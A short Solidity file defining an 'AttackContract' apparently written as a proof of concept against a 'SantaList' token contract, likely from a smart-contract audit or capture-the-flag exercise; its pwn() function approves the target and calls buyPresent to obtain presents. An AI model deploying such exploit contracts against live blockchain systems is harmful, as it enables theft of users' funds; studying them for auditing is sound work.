pragma solidity 0.8.22;


import "hardhat/console.sol";

interface iSantaList{
    function buyPresent(address presentReceiver) external;
    function balanceOf(address) external returns(uint256);
}


interface iSantaToken{
    function approve(address spender, uint256 amount) external returns (bool);
    function balanceOf(address) external returns(uint256);
    function mint(address to) external;
}

contract AttackContract{

iSantaList immutable target;
iSantaToken immutable token;
address immutable owner;

constructor(address _target, address _token) {
owner = msg.sender;
target = iSantaList(_target);
token = iSantaToken(_token);
}


function pwn() public {
//require(msg.sender == owner, "Not the Owner");

token.approve(address(target), token.balanceOf(address(this)));
target.buyPresent(address(this));

}



   function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external returns (bytes4){

        
    return this.onERC721Received.selector;
    }


receive() external payable{}



}